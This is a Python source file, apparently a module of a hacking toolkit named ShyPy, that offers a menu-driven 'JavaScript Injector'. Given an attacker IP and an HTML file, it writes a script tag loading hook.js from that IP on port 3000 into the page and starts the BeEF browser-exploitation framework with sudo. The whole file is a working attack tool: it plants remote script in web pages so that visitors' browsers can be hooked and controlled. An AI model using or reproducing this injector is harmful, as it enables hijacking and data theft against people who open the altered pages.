import subprocess
import time
import os
import platform
from shypy import Shypy

OS = platform.system().lower()

colors = {
    'BLACK': '\033[0;30m',
    'RED': '\033[0;31m',
    'GREEN': '\033[0;32m',
    'YELLOW': '\033[0;33m',
    'BLUE': '\033[0;34m',
    'MAGENTA': '\033[0;35m',
    'CYAN': '\033[0;36m',
    'WHITE': '\033[0;37m',
    'ZERO': '\033[0m'
}


class Js_Injector():
    def __init__(self):
        self.ip = ""
        self.location = ""

    def start(self):
        self.clear()
        print(f"""
            ╔══════════════════════════════════════════════════════════════════════╗
            ║*                     - JavaScript Injector -                        *║
            ╠══════════════════════════════════════════════════════════════════════╣
            ║* RULES : Operating System Must Be Linux Or The Program Will Not Run. ║
            ╠══════════════════════════════════╦═══════════════════════════════════╣ 
            ║            Commands              ║            Function               ║    
            ╠══════════════════════════════════╬═══════════════════════════════════╣   
            ║ "set.ip"                         : Set Own IP.                       ║ 
            ║ "set.location"                   : Set Html File Location.           ║
            ║ "generate"                       : Generate a Js Injector.           ║
            ║ "back"                           : Back To Shypy.                    ║                              
            ╠══════════════════════════════════╬═══════════════════════════════════╣
            ║*             OWN IP              : {self.ip}
            ╠══════════════════════════════════╬═══════════════════════════════════╬
            ║*       HTML FİLE LOCATİON        : {self.location}
            ╠══════════════════════════════════╩═══════════════════════════════════╣            
            ║*                            - The ShyPy -                           *║ 
            ╚══════════════════════════════════════════════════════════════════════╝
            \n\n""")
        
        answer = input(f"{colors['RED']}[ShyPy] =>{colors['ZERO']} ").lower()
              
        if answer.startswith("set.ip "):
            answer = answer.replace('set.ip ', '') 
            self.ip= answer
            self.start()
                   
        elif answer.startswith("set.location "):
            answer = answer.replace('set.location ', '') 
            self.location = answer
            self.start() 
        
        elif answer == "generate":
            if platform.system() == "Windows":
                print(f"{colors['YELLOW']}[!]{colors['ZERO']} Invalid OS")
                time.sleep(1)
                self.start()
                
            else:
                self.add_hook(self.location, self.ip)

        elif answer == "set.ip":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} set.ip <IP>")
            time.sleep(0.5)
            self.start()
        
        elif answer == "set.location":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} set.location <File Location>")
            time.sleep(0.5)
            self.start()
            
        elif answer == "back":
            s = Shypy()
            s.program_menu()

        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Invalid Option")
            time.sleep(0.5)
            self.start()
    
    def add_hook(self, location, ip):
        try:
            with open(location, "r+", encoding="utf-8") as file:
                html = file.read()

                if "</head>" in html:
                    new_html = html.replace("</head>", f"\t<script src=http://{ip}:3000/hook.js> </script>\n" + "</head>")

                else:
                    new_html = f'<!DOCTYPE html>\n\
                                <html lang="en">\n\
                                <head>\n\t\
                                <meta charset="UTF-8">\n\t\
                                <meta http-equiv="X-UA-Compatible" content="IE=edge">\n\t\
                                <meta name="viewport" content="width=device-width, initial-scale=1.0">\n\t\
                                <title>Document</title>\n\t\
                                <script src="http://{ip}:3000/hook.js"></script>\n\
                                </head>\n\
                                <body>\n\n\
                                </body>\n\
                                </html>'

                file.seek(0)
                file.write(new_html)
                file.truncate()
                print(f"{colors['GREEN']}[+]{colors['ZERO']} Hook has been added successfully!")
                time.sleep(1)
                print(f"{colors['BLUE']}[*]{colors['ZERO']} Starting Beef...")

                try:
                    subprocess.call(["sudo", "beef-xss", "start"])
                except:
                    print(f"{colors['BLUE']}[X]{colors['ZERO']} Beef is not installed on your system!")

        except FileNotFoundError:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Invalid File Location")
            time.sleep(1)
            self.start()

        except IsADirectoryError:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Invalid File Location")
            time.sleep(1)
            self.start()

    def clear(self):
        if OS == "linux" or OS == "darwin":
            os.system("clear")
        elif OS == "windows":
            os.system("cls")
